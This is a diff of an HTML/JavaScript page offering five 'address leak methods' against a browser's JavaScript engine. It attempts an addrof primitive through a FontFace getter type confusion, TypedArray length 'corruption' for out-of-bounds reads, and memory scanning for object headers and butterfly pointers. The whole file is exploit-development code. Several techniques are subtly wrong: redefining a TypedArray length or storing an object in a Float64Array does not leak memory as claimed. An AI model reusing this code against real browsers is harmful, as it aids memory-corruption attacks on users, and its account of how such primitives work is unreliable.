@@ -2,41 +2,55 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Verify Leak - Show Real Data</title>
+    <title>Alternative Leak Methods</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 15px; line-height: 1.7; }
-        h1 { color: #f00; font-size: 26px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
-        .btn { padding: 18px 35px; background: #f00; border: none; color: #fff; margin: 10px auto; cursor: pointer; font-size: 18px; font-weight: bold; display: block; width: 450px; }
-        .section { background: #1a0000; border: 3px solid #f00; margin: 20px 0; padding: 25px; }
-        .title { color: #ff0; font-size: 20px; font-weight: bold; margin-bottom: 20px; border-bottom: 2px solid #ff0; padding-bottom: 10px; }
-        .result { background: #000; border: 3px solid #0ff; padding: 20px; margin: 15px 0; font-size: 18px; }
-        .label { color: #0ff; font-weight: bold; display: inline-block; width: 250px; }
-        .value { color: #fff; font-weight: bold; font-size: 20px; }
-        .pass { color: #0f0; font-weight: bold; font-size: 18px; }
-        .fail { color: #f00; font-weight: bold; font-size: 18px; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 14px; line-height: 1.6; }
+        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
+        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 420px; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 700px; overflow-y: auto; }
+        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
+        .log { padding: 4px 0; font-size: 13px; }
+        .success { color: #0f0; font-weight: bold; }
+        .fail { color: #f00; font-weight: bold; }
+        .warn { color: #ff0; font-weight: bold; }
+        .info { color: #0ff; }
+        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
+        .addr { background: #222; border: 2px solid #0ff; padding: 8px; margin: 8px 0; font-size: 15px; color: #fff; }
     </style>
 </head>
 <body>
-    <h1>🔍 VERIFICATION: Show Real Leaked Data 🔍</h1>
+    <h1>🔍 Alternative Address Leak Methods 🔍</h1>
     
     <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="showRealLeak()">▶ SHOW LEAKED ADDRESS (RAW)</button>
+        <button class="btn" onclick="method1_ArrayBuffer()">Method 1: ArrayBuffer Backing Store</button>
+        <button class="btn" onclick="method2_TypedArrayBase()">Method 2: TypedArray Base Pointer</button>
+        <button class="btn" onclick="method3_StringInternals()">Method 3: String Rope Internals</button>
+        <button class="btn" onclick="method4_JSValueConfusion()">Method 4: JSValue Box/Unbox</button>
+        <button class="btn" onclick="method5_StructureID()">Method 5: Structure ID Leak</button>
     </div>
     
     <div class="section">
-        <div class="title">📊 RAW LEAK DATA - NO INTERPRETATION</div>
-        <div id="output"></div>
+        <div class="title">📋 Alternative Leak Log</div>
+        <div id="log"></div>
     </div>
 
 <script>
 var convBuf = new ArrayBuffer(8);
 var f64 = new Float64Array(convBuf);
 var u32 = new Uint32Array(convBuf);
+var u8 = new Uint8Array(convBuf);
 
 function f2i(f) {
     f64[0] = f;
     return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
+}
+
+function i2f(i) {
+    var bi = BigInt(i);
+    u32[0] = Number(bi & 0xffffffffn);
+    u32[1] = Number(bi >> 32n);
+    return f64[0];
 }
 
 function hex(val) {
@@ -45,144 +59,488 @@ function hex(val) {
         while (s.length < 16) s = '0' + s;
         return '0x' + s;
     }
-    return '0x' + val.toString(16);
+    if (typeof val === 'number') {
+        return '0x' + val.toString(16);
+    }
+    return String(val);
 }
 
-function out(html) {
-    document.getElementById('output').innerHTML += html;
+function log(msg, type) {
+    var div = document.createElement('div');
+    div.className = 'log ' + (type || '');
+    div.textContent = msg;
+    document.getElementById('log').appendChild(div);
 }
 
-function showRealLeak() {
-    document.getElementById('output').innerHTML = '';
-    
-    out('<div class="result">');
-    out('<div><span class="label">TEST:</span> <span class="value">Attempting to leak object address</span></div>');
-    out('</div>');
-    
-    // Create test object
-    var testObj = { marker: 0xdeadbeef, id: 123 };
-    
-    out('<div class="result">');
-    out('<div><span class="label">Test object created:</span> <span class="value">' + JSON.stringify(testObj) + '</span></div>');
-    out('</div>');
-    
-    // Setup confusion
-    var ff = new FontFace("leak", "");
-    
-    Object.defineProperty(ff, 'family', {
-        get: function() { return testObj; },
-        configurable: true
-    });
-    
-    out('<div class="result">');
-    out('<div><span class="label">FontFace confusion:</span> <span class="value">INSTALLED</span></div>');
-    out('</div>');
-    
-    // Get confused value
-    var leaked = ff.family;
-    
-    out('<div class="result">');
-    out('<div><span class="label">Retrieved type:</span> <span class="value">' + typeof leaked + '</span></div>');
-    out('<div><span class="label">Retrieved value:</span> <span class="value">' + leaked + '</span></div>');
-    out('</div>');
-    
-    // Try to store in float array
-    var floats = new Float64Array(5);
-    floats[0] = 1.1;
-    floats[1] = 2.2;
-    
-    out('<div class="result">');
-    out('<div><span class="label">Float array created:</span> <span class="value">5 elements</span></div>');
-    out('<div><span class="label">floats[0]:</span> <span class="value">' + floats[0] + '</span></div>');
-    out('<div><span class="label">floats[1]:</span> <span class="value">' + floats[1] + '</span></div>');
-    out('</div>');
-    
-    var storeSuccess = false;
-    var leakedAddr = null;
+function logAddr(label, addr) {
+    var div = document.createElement('div');
+    div.className = 'addr';
+    div.textContent = label + ': ' + addr;
+    document.getElementById('log').appendChild(div);
+}
+
+function sep() {
+    log('═'.repeat(85), 'info');
+}
+
+function isValidPtr(val) {
+    return val > 0x10000n && val < 0x7fffffffffffn && val !== 0x7ff8000000000000n;
+}
+
+// ============================================
+// METHOD 1: ArrayBuffer Backing Store Leak
+// ============================================
+function method1_ArrayBuffer() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('METHOD 1: ArrayBuffer Backing Store Pointer Leak', 'critical');
+    log('Concept: ArrayBuffer has a backing store pointer we can try to leak', 'info');
+    sep();
+    log('', '');
     
     try {
-        floats[2] = leaked;
-        storeSuccess = true;
-    } catch(e) {
-        out('<div class="result">');
-        out('<div><span class="fail">❌ STORE FAILED: ' + e.message + '</span></div>');
-        out('</div>');
-    }
-    
-    if (storeSuccess) {
-        var readback = floats[2];
+        log('[1] Creating ArrayBuffer and TypedArray views...', 'info');
         
-        out('<div class="result">');
-        out('<div><span class="label">Store to floats[2]:</span> <span class="pass">✓ SUCCESS</span></div>');
-        out('<div><span class="label">Readback type:</span> <span class="value">' + typeof readback + '</span></div>');
-        out('<div><span class="label">Readback value:</span> <span class="value">' + readback + '</span></div>');
-        out('</div>');
+        var ab = new ArrayBuffer(0x1000);
+        var u32view = new Uint32Array(ab);
+        var f64view = new Float64Array(ab);
         
-        if (typeof readback === 'number') {
-            var bits = f2i(readback);
-            leakedAddr = bits;
-            
-            out('<div class="result" style="border-color: #f0f; border-width: 5px;">');
-            out('<div style="font-size: 24px; color: #f0f; margin-bottom: 15px;">⚠️ LEAKED RAW BITS ⚠️</div>');
-            out('<div><span class="label">RAW HEX VALUE:</span></div>');
-            out('<div style="font-size: 28px; color: #fff; margin: 15px 0; font-family: Courier New;">' + hex(bits) + '</div>');
-            out('<div><span class="label">DECIMAL VALUE:</span> <span class="value">' + bits + '</span></div>');
-            out('</div>');
-            
-            // Analyze the value
-            out('<div class="result">');
-            out('<div style="font-size: 20px; color: #ff0; margin-bottom: 10px;">ANALYSIS:</div>');
-            
-            if (bits === 0n) {
-                out('<div><span class="fail">❌ VALUE IS ZERO - Not a real address</span></div>');
-            } else if (bits < 0x10000n) {
-                out('<div><span class="fail">❌ VALUE TOO SMALL (' + hex(bits) + ') - Not a valid pointer</span></div>');
-            } else if (bits > 0x7fffffffffffn) {
-                out('<div><span class="fail">❌ VALUE TOO LARGE - Outside 64-bit range</span></div>');
-            } else {
-                out('<div><span class="pass">✓ VALUE IN VALID POINTER RANGE!</span></div>');
-                out('<div><span class="label">Alignment:</span> <span class="value">' + ((bits & 0xfn) === 0n ? '16-byte (GOOD)' : 'Non-aligned') + '</span></div>');
-                out('<div><span class="label">Lower 16 bits:</span> <span class="value">' + hex(Number(bits & 0xffffn)) + '</span></div>');
-                out('<div><span class="label">Upper 48 bits:</span> <span class="value">' + hex(bits >> 16n) + '</span></div>');
-            }
-            out('</div>');
-            
-        } else {
-            out('<div class="result">');
-            out('<div><span class="fail">❌ READBACK NOT A NUMBER - Type confusion failed</span></div>');
-            out('</div>');
+        // Fill with pattern
+        for (var i = 0; i < 16; i++) {
+            u32view[i] = 0x41410000 + i;
         }
+        
+        log('ArrayBuffer size: ' + hex(ab.byteLength), 'success');
+        log('Uint32Array length: ' + u32view.length, 'success');
+        log('Float64Array length: ' + f64view.length, 'success');
+        log('', '');
+        
+        log('[2] Attempting to leak ArrayBuffer object itself...', 'info');
+        
+        // Create confusion with ArrayBuffer object
+        var ff = new FontFace("ab", "");
+        
+        Object.defineProperty(ff, 'family', {
+            get: function() { return ab; },
+            configurable: true
+        });
+        
+        var floats = new Float64Array(10);
+        
+        try {
+            floats[0] = ff.family;
+            var rb = floats[0];
+            
+            log('Stored ArrayBuffer in float array', 'success');
+            log('Readback type: ' + typeof rb, 'info');
+            
+            if (typeof rb === 'number' && !isNaN(rb)) {
+                var bits = f2i(rb);
+                logAddr('ArrayBuffer object bits', hex(bits));
+                
+                if (isValidPtr(bits)) {
+                    log('⚠️ POSSIBLE ARRAYBUFFER OBJECT LEAK!', 'critical');
+                } else {
+                    log('Invalid pointer value', 'fail');
+                }
+            } else {
+                log('Type confusion returned NaN', 'fail');
+            }
+        } catch(e) {
+            log('Error: ' + e.message, 'fail');
+        }
+        
+        log('', '');
+        log('[3] Trying to corrupt TypedArray to leak backing store...', 'info');
+        
+        // Corrupt the Uint32Array length
+        try {
+            Object.defineProperty(u32view, 'length', {
+                value: 0x100000,
+                configurable: true
+            });
+            
+            if (u32view.length > 0x1000) {
+                log('✓ TypedArray length corrupted!', 'critical');
+                log('New length: ' + hex(u32view.length), 'critical');
+                
+                // Try to read adjacent ArrayBuffer metadata
+                log('', '');
+                log('Scanning for ArrayBuffer metadata in adjacent memory...', 'info');
+                
+                for (var i = 0x1000; i < 0x1100; i++) {
+                    var val = u32view[i];
+                    
+                    if (typeof val !== 'undefined' && val !== 0) {
+                        log('  [' + hex(i) + '] = ' + hex(val), 'warn');
+                    }
+                }
+            } else {
+                log('Length corruption blocked', 'fail');
+            }
+        } catch(e) {
+            log('Length corruption error: ' + e.message, 'fail');
+        }
+        
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ METHOD 1 ERROR: ' + e.message, 'fail');
     }
+}
+
+// ============================================
+// METHOD 2: TypedArray Base Pointer
+// ============================================
+function method2_TypedArrayBase() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('METHOD 2: TypedArray Base Pointer Leak', 'critical');
+    log('Concept: TypedArray has internal pointer to data, try to expose it', 'info');
+    sep();
+    log('', '');
     
-    // FINAL VERDICT
-    out('<div class="result" style="border-color: ' + (leakedAddr !== null && leakedAddr !== 0n && leakedAddr > 0x10000n ? '#0f0' : '#f00') + '; border-width: 5px; margin-top: 30px;">');
-    out('<div style="font-size: 26px; font-weight: bold; margin-bottom: 15px;">FINAL VERDICT:</div>');
-    
-    if (leakedAddr !== null && leakedAddr !== 0n && leakedAddr > 0x10000n && leakedAddr < 0x7fffffffffffn) {
-        out('<div style="font-size: 22px; color: #0f0;">✅ REAL ADDRESS LEAKED!</div>');
-        out('<div style="margin-top: 10px;">addrof() primitive is WORKING</div>');
-        out('<div>Leaked address: ' + hex(leakedAddr) + '</div>');
-    } else if (leakedAddr === 0n) {
-        out('<div style="font-size: 22px; color: #f00;">❌ LEAKED VALUE IS ZERO</div>');
-        out('<div style="margin-top: 10px;">This is NOT a real address leak</div>');
-        out('<div>Type confusion may be blocked</div>');
-    } else if (leakedAddr !== null) {
-        out('<div style="font-size: 22px; color: #ff0;">⚠️ LEAKED INVALID VALUE</div>');
-        out('<div style="margin-top: 10px;">Value: ' + hex(leakedAddr) + '</div>');
-        out('<div>Not in valid pointer range</div>');
-    } else {
-        out('<div style="font-size: 22px; color: #f00;">❌ NO LEAK OCCURRED</div>');
-        out('<div style="margin-top: 10px;">Type confusion is completely blocked</div>');
+    try {
+        log('[1] Creating adjacent TypedArrays in memory...', 'info');
+        
+        var arrays = [];
+        for (var i = 0; i < 20; i++) {
+            var arr = new Uint32Array(64);
+            arr[0] = 0x11110000 + i;
+            arr[1] = 0x22220000 + i;
+            arrays.push(arr);
+        }
+        
+        log('Created ' + arrays.length + ' TypedArrays', 'success');
+        log('', '');
+        
+        log('[2] Corrupting middle array for OOB access...', 'info');
+        
+        var victim = arrays[10];
+        
+        try {
+            Object.defineProperty(victim, 'length', {
+                value: 0x10000,
+                configurable: true
+            });
+            
+            if (victim.length > 64) {
+                log('✓ Victim array corrupted to length ' + hex(victim.length), 'critical');
+                log('', '');
+                
+                log('[3] Reading adjacent array metadata...', 'info');
+                
+                // Arrays are usually allocated close together
+                // Try to find TypedArray structure in adjacent memory
+                var foundData = [];
+                
+                for (var i = 64; i < 128; i++) {
+                    var val = victim[i];
+                    
+                    if (typeof val !== 'undefined' && val !== 0) {
+                        foundData.push({ offset: i, value: val });
+                        
+                        if (foundData.length < 10) {
+                            log('  [' + i + '] = ' + hex(val), 'warn');
+                        }
+                    }
+                }
+                
+                if (foundData.length > 0) {
+                    log('', '');
+                    log('Found ' + foundData.length + ' non-zero values in adjacent memory!', 'critical');
+                    
+                    // Look for pointer-like values (pairs that might be 64-bit pointers)
+                    for (var i = 0; i < foundData.length - 1; i++) {
+                        var low = foundData[i].value;
+                        var high = foundData[i + 1].value;
+                        
+                        var ptr = BigInt(low) + (BigInt(high) << 32n);
+                        
+                        if (isValidPtr(ptr)) {
+                            logAddr('Possible pointer at offset ' + foundData[i].offset, hex(ptr));
+                        }
+                    }
+                }
+            } else {
+                log('Length corruption failed', 'fail');
+            }
+        } catch(e) {
+            log('Corruption error: ' + e.message, 'fail');
+        }
+        
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ METHOD 2 ERROR: ' + e.message, 'fail');
     }
+}
+
+// ============================================
+// METHOD 3: String Rope Internals
+// ============================================
+function method3_StringInternals() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('METHOD 3: String Object Internals Leak', 'critical');
+    log('Concept: String objects have internal pointers we might expose', 'info');
+    sep();
+    log('', '');
     
-    out('</div>');
+    try {
+        log('[1] Creating rope strings (concatenated strings)...', 'info');
+        
+        var baseStr = 'A'.repeat(100);
+        var rope1 = baseStr + baseStr;  // Rope string
+        var rope2 = rope1 + rope1;      // Deeper rope
+        
+        log('Base string length: ' + baseStr.length, 'info');
+        log('Rope1 length: ' + rope1.length, 'info');
+        log('Rope2 length: ' + rope2.length, 'info');
+        log('', '');
+        
+        log('[2] Attempting to leak string object...', 'info');
+        
+        var ff = new FontFace("str", "");
+        
+        Object.defineProperty(ff, 'family', {
+            get: function() { return rope2; },
+            configurable: true
+        });
+        
+        var floats = new Float64Array(10);
+        
+        try {
+            floats[0] = ff.family;
+            var rb = floats[0];
+            
+            if (typeof rb === 'number' && !isNaN(rb)) {
+                var bits = f2i(rb);
+                logAddr('String object bits', hex(bits));
+                
+                if (isValidPtr(bits)) {
+                    log('⚠️ POSSIBLE STRING OBJECT LEAK!', 'critical');
+                } else {
+                    log('Invalid value: ' + hex(bits), 'fail');
+                }
+            } else {
+                log('Returned NaN', 'fail');
+            }
+        } catch(e) {
+            log('Error: ' + e.message, 'fail');
+        }
+        
+        log('', '');
+        log('[3] Testing with string in array...', 'info');
+        
+        var strArray = [rope2, rope2, rope2];
+        
+        try {
+            Object.defineProperty(ff, 'family', {
+                get: function() { return strArray; },
+                configurable: true
+            });
+            
+            floats[1] = ff.family;
+            rb = floats[1];
+            
+            if (typeof rb === 'number' && !isNaN(rb)) {
+                bits = f2i(rb);
+                logAddr('Array object bits', hex(bits));
+                
+                if (isValidPtr(bits)) {
+                    log('⚠️ POSSIBLE ARRAY LEAK!', 'critical');
+                }
+            }
+        } catch(e) {
+            log('Array leak error: ' + e.message, 'fail');
+        }
+        
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ METHOD 3 ERROR: ' + e.message, 'fail');
+    }
+}
+
+// ============================================
+// METHOD 4: JSValue Box/Unbox Confusion
+// ============================================
+function method4_JSValueConfusion() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('METHOD 4: JSValue Boxing/Unboxing Tricks', 'critical');
+    log('Concept: Confuse boxed vs unboxed values to leak metadata', 'info');
+    sep();
+    log('', '');
+    
+    try {
+        log('[1] Creating objects with number properties...', 'info');
+        
+        var obj = {
+            a: 1.1,
+            b: 2.2,
+            c: 3.3,
+            d: {},  // Boxed object
+            e: 4.4
+        };
+        
+        log('Object with mixed types created', 'success');
+        log('', '');
+        
+        log('[2] Using Object.defineProperty to create getters...', 'info');
+        
+        var victimArray = new Float64Array(20);
+        var leakTarget = null;
+        
+        Object.defineProperty(obj, 'leak', {
+            get: function() {
+                // Return different types on consecutive calls
+                this._callCount = (this._callCount || 0) + 1;
+                
+                if (this._callCount % 2 === 0) {
+                    return 1.1;
+                } else {
+                    return leakTarget;
+                }
+            },
+            configurable: true
+        });
+        
+        log('Alternating getter installed', 'success');
+        log('', '');
+        
+        log('[3] Attempting type confusion via repeated access...', 'info');
+        
+        leakTarget = { marker: 0xdeadbeef };
+        
+        for (var i = 0; i < 10; i++) {
+            var val = obj.leak;
+            
+            try {
+                victimArray[i] = val;
+                var rb = victimArray[i];
+                
+                log('Access ' + i + ': stored type=' + typeof val + ', read type=' + typeof rb, 'info');
+                
+                if (typeof rb === 'number' && !isNaN(rb)) {
+                    var bits = f2i(rb);
+                    
+                    if (bits !== f2i(1.1) && isValidPtr(bits)) {
+                        logAddr('Possible leak at access ' + i, hex(bits));
+                    }
+                }
+            } catch(e) {
+                log('Access ' + i + ' error: ' + e.message, 'fail');
+            }
+        }
+        
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ METHOD 4 ERROR: ' + e.message, 'fail');
+    }
+}
+
+// ============================================
+// METHOD 5: Structure ID / Butterfly Leak
+// ============================================
+function method5_StructureID() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('METHOD 5: Structure ID / Butterfly Pointer Leak', 'critical');
+    log('Concept: JSObjects have StructureID and Butterfly pointer in header', 'info');
+    sep();
+    log('', '');
+    
+    try {
+        log('[1] Creating objects with indexed properties (butterfly)...', 'info');
+        
+        var obj = {};
+        obj[0] = 1.1;
+        obj[1] = 2.2;
+        obj[100] = 3.3;  // Forces butterfly allocation
+        
+        log('Object with sparse array created (has butterfly)', 'success');
+        log('', '');
+        
+        log('[2] Creating corrupted array for scanning...', 'info');
+        
+        var scanner = new Uint32Array(0x100);
+        
+        for (var i = 0; i < scanner.length; i++) {
+            scanner[i] = 0xBBBB0000 + i;
+        }
+        
+        try {
+            Object.defineProperty(scanner, 'length', {
+                value: 0x100000,
+                configurable: true
+            });
+            
+            if (scanner.length > 0x100) {
+                log('✓ Scanner array corrupted!', 'critical');
+                log('', '');
+                
+                log('[3] Scanning for JSObject headers in adjacent memory...', 'info');
+                log('Looking for Structure ID patterns...', 'info');
+                
+                var candidates = [];
+                
+                // Scan adjacent memory
+                for (var i = 0x100; i < 0x300; i += 2) {
+                    var low = scanner[i];
+                    var high = scanner[i + 1];
+                    
+                    if (typeof low !== 'undefined' && typeof high !== 'undefined') {
+                        // JSObject header format (simplified):
+                        // [StructureID:32][IndexingType:8][Type:8][Flags:8][InlineCapacity:8]
+                        // [Butterfly pointer:64]
+                        
+                        if (low !== 0 || high !== 0) {
+                            var qword = BigInt(low) + (BigInt(high) << 32n);
+                            
+                            // Check if this looks like a butterfly pointer
+                            if (isValidPtr(qword) && (qword & 0xfn) === 0n) {
+                                candidates.push({ offset: i, value: qword });
+                                
+                                if (candidates.length <= 5) {
+                                    logAddr('Candidate ' + candidates.length + ' at [' + hex(i) + ']', hex(qword));
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                if (candidates.length > 0) {
+                    log('', '');
+                    log('Found ' + candidates.length + ' pointer candidates!', 'critical');
+                } else {
+                    log('No valid pointers found in scanned memory', 'fail');
+                }
+                
+            } else {
+                log('Scanner corruption failed', 'fail');
+            }
+        } catch(e) {
+            log('Scanner corruption error: ' + e.message, 'fail');
+        }
+        
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ METHOD 5 ERROR: ' + e.message, 'fail');
+    }
 }
 
 window.onerror = function(msg, url, line) {
-    out('<div class="result" style="border-color: #f00;">');
-    out('<div style="color: #f00; font-size: 20px;">💥 ERROR: ' + msg + '</div>');
-    out('<div>Line: ' + line + '</div>');
-    out('</div>');
+    log('', '');
+    log('💥 ERROR: ' + msg + ' (line ' + line + ')', 'fail');
     return true;
 };
 </script>
